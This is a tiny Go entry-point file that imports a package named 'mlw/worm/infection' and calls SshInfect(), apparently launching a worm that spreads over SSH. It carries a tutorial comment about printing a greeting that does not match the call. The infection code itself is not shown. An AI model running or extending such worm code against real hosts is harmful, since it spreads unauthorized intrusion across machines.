package main

import (
	"fmt"
	"github.com/99graciamanel/mlw/worm/infection"
)

func main() {
	// Get a greeting message and print it.
	message := infection.SshInfect()
	fmt.Println(message)
}
